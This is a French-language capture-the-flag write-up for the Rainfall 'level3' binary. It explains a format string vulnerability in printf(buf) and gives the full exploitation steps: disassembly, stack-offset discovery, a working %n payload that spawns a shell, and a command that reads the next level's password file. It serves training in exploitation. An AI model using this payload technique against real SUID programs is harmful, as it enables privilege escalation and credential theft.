
---

# Rainfall — Flag 3

## Objectif

Analyser le binaire `level3`, identifier la vulnérabilité présente, et l’exploiter afin d’exécuter un shell permettant de récupérer le mot de passe du niveau suivant (`level4`).

---

## Analyse initiale du binaire

L’analyse du point d’entrée montre que la fonction `main` ne contient aucune logique particulière : elle appelle directement une fonction `v()`.

### Désassemblage de `main`

```asm
Dump of assembler code for function main:
   0x0804851a <+0>:  push   %ebp
   0x0804851b <+1>:  mov    %esp,%ebp
   0x0804851d <+3>:  and    $0xfffffff0,%esp
   0x08048520 <+6>:  call   0x80484a4 <v>
   0x08048525 <+11>: leave
   0x08048526 <+12>: ret
```

La fonction `v()` est donc le **cœur logique et vulnérable** du programme.

---

## Analyse détaillée de la fonction `v`

### Désassemblage complet

```asm
Dump of assembler code for function v:
   0x080484a4 <+0>:  push   %ebp
   0x080484a5 <+1>:  mov    %esp,%ebp
   0x080484a7 <+3>:  sub    $0x218,%esp

   0x080484ad <+9>:  mov    0x8049860,%eax
   0x080484b2 <+14>: mov    %eax,0x8(%esp)
   0x080484b6 <+18>: movl   $0x200,0x4(%esp)
   0x080484be <+26>: lea    -0x208(%ebp),%eax
   0x080484c4 <+32>: mov    %eax,(%esp)
   0x080484c7 <+35>: call   fgets@plt

   0x080484cc <+40>: lea    -0x208(%ebp),%eax
   0x080484d2 <+46>: mov    %eax,(%esp)
   0x080484d5 <+49>: call   printf@plt

   0x080484da <+54>: mov    0x804988c,%eax
   0x080484df <+59>: cmp    $0x40,%eax
   0x080484e2 <+62>: jne    0x8048518 <v+116>

   0x080484e4 <+64>: mov    0x8049880,%eax
   0x080484eb <+71>: mov    $0x8048600,%eax
   0x08048507 <+99>: call   fwrite@plt

   0x0804850c <+104>: movl   $0x804860d,(%esp)
   0x08048513 <+111>: call   system@plt

   0x08048518 <+116>: leave
   0x08048519 <+117>: ret
```

---

## Comportement du programme (vue logique)

À partir de l’assembleur, on peut reconstituer le pseudo-code suivant :

```c
void v(void) {
    char buf[512];

    fgets(buf, 512, stdin);
    printf(buf);                 // VULNÉRABILITÉ

    if (*(int *)0x804988c == 0x40) {
        fwrite("Wait what?!\n", 1, 12, stdout);
        system("/bin/sh");
    }
}
```

---

## Vulnérabilité identifiée

### Type de vulnérabilité

**Format String Vulnerability**

### Cause

Le programme appelle `printf` directement avec une chaîne contrôlée par l’utilisateur :

```c
printf(buf);
```

Aucun format n’est spécifié (`"%s"`), ce qui permet à l’utilisateur :

* de lire des valeurs arbitraires sur la stack (`%x`, `%p`)
* **d’écrire en mémoire** via le spécificateur `%n`

---

## Objectif de l’exploitation

La condition critique est :

```asm
mov 0x804988c, %eax
cmp $0x40, %eax
```

Pour déclencher `system("/bin/sh")`, il faut :

> écrire la valeur **0x40 (64 décimal)** à l’adresse **0x804988c**

---

## Principe général de l’exploitation

1. `fgets` copie l’entrée utilisateur dans un buffer **local sur la stack**
2. `printf(buf)` interprète ce buffer comme **format string**
3. Les spécificateurs `%x`, `%n`, etc. forcent `printf` à lire des arguments **non fournis**
4. `printf` lit alors des mots arbitraires depuis la stack
5. Une partie de ces mots provient du buffer utilisateur
6. En injectant une **adresse ciblée dans le buffer**, celle-ci peut être interprétée comme un argument
7. Le spécificateur `%n` permet d’écrire à l’adresse ainsi récupérée

---

## Recherche de l’offset dans la stack

Pour déterminer à quel “numéro d’argument” correspond notre input, on utilise un marqueur reconnaissable :

```bash
python -c 'print("AAAA.%x.%x.%x.%x.%x.%x")' | ./level3
```

Lorsque la valeur `41414141` apparaît dans la sortie, cela indique que `printf` lit les octets `"AAAA"` comme argument.

Dans ce binaire, l’adresse injectée apparaît comme **4ᵉ argument**.

➡️ L’offset à utiliser est donc **`%4$...`**

---

## Construction du payload

### Adresse cible

Adresse de la variable globale :

```
0x804988c
```

Architecture x86 → **little endian** :

```
\x8c\x98\x04\x08
```

---

### Payload final

```bash
(python -c 'print("\x8c\x98\x04\x08" + "%60d%4$n")'; cat) | ./level3
```

---

## Déroulement précis de l’exploit

1. `fgets` écrit le payload dans `buf` (stack)
2. `printf(buf)` commence à afficher :

   * les 4 octets initiaux (`\x8c\x98\x04\x08`)
3. `printf` affiche ensuite 60 caractères via `%60d`
4. Le compteur interne de caractères imprimés vaut maintenant **64**
5. `%4$n` écrit cette valeur à l’adresse contenue dans l’argument #4
6. L’argument #4 correspond à `0x804988c`
7. La condition `*(int*)0x804988c == 64` est validée
8. `system("/bin/sh")` est exécuté

---

## Schéma simplifié de la stack (moment clé)

```
(adresses hautes)
│
│ return addr (vers main)
│ saved EBP
├────────────────────────────
│ buf[0] = 0x8c
│ buf[1] = 0x98
│ buf[2] = 0x04
│ buf[3] = 0x08   ← interprété comme argument #4
│ ...
├────────────────────────────
│ arguments fantômes lus par printf
│ %4$n → écrit à 0x804988c
│
(adresses basses)
```

---

## Récupération du flag

Une fois le shell obtenu :

```bash
cat /home/user/level4/.pass
```

---

## Conclusion

* Le niveau 3 repose sur une **vulnérabilité de type format string**
* L’absence de format explicite dans `printf` permet :

  * la lecture
  * l’écriture arbitraire en mémoire
* L’exploitation consiste à :

  * injecter l’adresse cible dans la stack
  * forcer `printf` à l’interpréter comme argument
  * écrire la valeur attendue via `%n`
* Ce niveau illustre parfaitement les dangers de `printf(user_input)` dans un programme SUID

---